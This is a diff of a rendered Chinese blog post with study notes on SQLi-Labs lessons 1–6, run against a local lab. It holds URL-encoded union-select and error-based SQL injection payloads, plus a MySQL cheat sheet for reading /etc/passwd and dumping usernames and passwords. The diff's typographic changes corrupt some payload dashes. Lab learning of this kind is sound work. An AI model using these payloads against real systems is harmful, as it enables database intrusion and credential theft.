@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做注释使用#放在地址栏必须编码%232. 做注释使用--放在地址栏必须加空格后再加字母(例如 -- a), 或者使用--+">
+<meta name="description" content="小知识 %20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; “%23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; ‘注:  做注释使用#放在地址栏必须编码%23 做注释使用–放在地址栏必须加空格后再加字母(例如 – a), 或者使用–+">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQLi-Labs学习笔记1~6">
 <meta property="og:url" content="http://yoursite.com/2019/01/07/SQLi-Labs学习笔记1-6/index.html">
 <meta property="og:site_name" content="风介穹宇">
-<meta property="og:description" content="小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做注释使用#放在地址栏必须编码%232. 做注释使用--放在地址栏必须加空格后再加字母(例如 -- a), 或者使用--+">
+<meta property="og:description" content="小知识 %20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; “%23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; ‘注:  做注释使用#放在地址栏必须编码%23 做注释使用–放在地址栏必须加空格后再加字母(例如 – a), 或者使用–+">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-09T09:55:17.834Z">
+<meta property="og:updated_time" content="2019-01-09T11:03:37.447Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi-Labs学习笔记1~6">
-<meta name="twitter:description" content="小知识12345678%20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; &amp;quot; %23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; &amp;apos;注:1. 做注释使用#放在地址栏必须编码%232. 做注释使用--放在地址栏必须加空格后再加字母(例如 -- a), 或者使用--+">
+<meta name="twitter:description" content="小知识 %20 -&amp;gt; （空格）直接在浏览器中执行，要使用必须写%20%22 -&amp;gt; “%23 -&amp;gt; # 直接在浏览器中执行，要使用必须写%23%25 -&amp;gt; %%27 -&amp;gt; ‘注:  做注释使用#放在地址栏必须编码%23 做注释使用–放在地址栏必须加空格后再加字母(例如 – a), 或者使用–+">
 
 
 
@@ -384,9 +384,20 @@
       
 
       
-        <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%20 -&gt; （空格）直接在浏览器中执行，要使用必须写%20</span><br><span class="line">%22 -&gt; &quot; </span><br><span class="line">%23 -&gt; # 直接在浏览器中执行，要使用必须写%23</span><br><span class="line">%25 -&gt; %</span><br><span class="line">%27 -&gt; &apos;</span><br><span class="line">注:</span><br><span class="line">1. 做注释使用#放在地址栏必须编码%23</span><br><span class="line">2. 做注释使用--放在地址栏必须加空格后再加字母(例如 -- a), 或者使用--+</span><br></pre></td></tr></table></figure>
+        <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><blockquote>
+<p>%20 -&gt; （空格）直接在浏览器中执行，要使用必须写%20<br>%22 -&gt; “<br>%23 -&gt; # 直接在浏览器中执行，要使用必须写%23<br>%25 -&gt; %<br>%27 -&gt; ‘<br>注:</p>
+<ol>
+<li>做注释使用#放在地址栏必须编码%23</li>
+<li>做注释使用–放在地址栏必须加空格后再加字母(例如 – a), 或者使用–+</li>
+</ol>
+</blockquote>
 <a id="more"></a>
-<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><h5 id="Lesson-1-4"><a href="#Lesson-1-4" class="headerlink" title="Lesson-1/4"></a>Lesson-1/4</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/Less-1/?id=-1%27%20union%20select%201,2,3%20%23</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8088/Less-2/?id=-1%20union%20select%201,2,3%20%23</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8088/Less-3/?id=-1%27)%20union%20select%201,2,3%20%23</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8088/Less-4/?id=-1%22)%20union%20select%201,2,3%20%23</span><br></pre></td></tr></table></figure>
+<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><h5 id="Lesson-1-4"><a href="#Lesson-1-4" class="headerlink" title="Lesson-1/4"></a>Lesson-1/4</h5><blockquote>
+<p><a href="http://127.0.0.1:8088/Less-1/?id=-1%27%20union%20select%201,2,3%20%23" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-1/?id=-1%27%20union%20select%201,2,3%20%23</a></p>
+<p><a href="http://127.0.0.1:8088/Less-2/?id=-1%20union%20select%201,2,3%20%23" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-2/?id=-1%20union%20select%201,2,3%20%23</a></p>
+<p><a href="http://127.0.0.1:8088/Less-3/?id=-1%27)%20union%20select%201,2,3%20%23" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-3/?id=-1%27)%20union%20select%201,2,3%20%23</a></p>
+<p><a href="http://127.0.0.1:8088/Less-4/?id=-1%22)%20union%20select%201,2,3%20%23" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-4/?id=-1%22)%20union%20select%201,2,3%20%23</a></p>
+</blockquote>
 <p>这种基于报错类型的注入，先要确定报错特殊符号，然后找回显点。</p>
 <p>正常显示，加单引号后报错，试到?id=1’ or ‘1’=’1时正常显示。</p>
 <p>这时我们再尝试下注释语句，得出以下语句也是成功的。</p>
@@ -399,11 +410,21 @@
 <p>Lesson-3加了括号；</p>
 <p>Lesson-4字符加了括号。</p>
 <hr>
-<h5 id="Lesson-5-6"><a href="#Lesson-5-6" class="headerlink" title="Lesson-5/6"></a>Lesson-5/6</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8088/Less-5/?id=1%27%20and%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1))%20--+</span><br><span class="line"></span><br><span class="line">http://127.0.0.1:8088/Less-6/?id=1%22%20and%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1))%20--+</span><br></pre></td></tr></table></figure>
+<h5 id="Lesson-5-6"><a href="#Lesson-5-6" class="headerlink" title="Lesson-5/6"></a>Lesson-5/6</h5><blockquote>
+<p><a href="http://127.0.0.1:8088/Less-5/?id=1%27%20and%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1))%20--+" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-5/?id=1%27%20and%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1))%20--+</a></p>
+<p><a href="http://127.0.0.1:8088/Less-6/?id=1%22%20and%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1))%20--+" target="_blank" rel="noopener">http://127.0.0.1:8088/Less-6/?id=1%22%20and%201=(updatexml(1,concat(0x5e24,(select%20user()),0x5e24),1))%20--+</a></p>
+</blockquote>
 <p>这里查询正确显示You are in………..，查询错误则不显示内容，报错正常显示。这里用<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">Double SQL Injection(双查询注入)</a> ，常用的报错函数如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.floor</span><br><span class="line">and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); --+</span><br><span class="line">2.ExtractValue</span><br><span class="line">and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); --+</span><br><span class="line">3.UpdateXml</span><br><span class="line">and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) --+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>1.floor<br>and (select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a); –+<br>2.ExtractValue<br>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); –+<br>3.UpdateXml<br>and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) –+</p>
+</blockquote>
 <p>Lesson-5/6就是单双引号的差别。</p>
-<h5 id="MySQL常用查询"><a href="#MySQL常用查询" class="headerlink" title="MySQL常用查询"></a>MySQL常用查询</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">基本查询</span><br><span class="line">数据库版本：version()</span><br><span class="line">当前数据库：database()</span><br><span class="line">当前用户：user()</span><br><span class="line">os版本：@@version_compile_os</span><br><span class="line">数据库路径：@@basedir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">用冒号连接：concat_ws(char(32,58,32),user(),database(),version())</span><br><span class="line"></span><br><span class="line">文件读取：load_file(&apos;/etc/passwd&apos;)</span><br><span class="line"></span><br><span class="line">查询所有数据库</span><br><span class="line">(select group_concat(schema_name) from information_schema.schemata)</span><br><span class="line">依据数据库查询表名</span><br><span class="line">(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;)</span><br><span class="line">依据数据库、表名查询列名</span><br><span class="line">(select group_concat(column_name) from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos;)</span><br><span class="line">查询用户名密码</span><br><span class="line">(select group_concat(username separator &apos;;&apos;) from users),(select group_concat(password separator &apos;;&apos;) from users)</span><br></pre></td></tr></table></figure>
+<h5 id="MySQL常用查询"><a href="#MySQL常用查询" class="headerlink" title="MySQL常用查询"></a>MySQL常用查询</h5><blockquote>
+<p>基本查询<br>数据库版本：version()<br>当前数据库：database()<br>当前用户：user()<br>os版本：@@version_compile_os<br>数据库路径：@@basedir</p>
+<p>用冒号连接：concat_ws(char(32,58,32),user(),database(),version())</p>
+<p>文件读取：load_file(‘/etc/passwd’)</p>
+<p>查询所有数据库<br>(select group_concat(schema_name) from information_schema.schemata)<br>依据数据库查询表名<br>(select group_concat(table_name) from information_schema.tables where table_schema=’security’)<br>依据数据库、表名查询列名<br>(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’)<br>查询用户名密码<br>(select group_concat(username separator ‘;’) from users),(select group_concat(password separator ‘;’) from users)</p>
+</blockquote>
 
       
     </div>
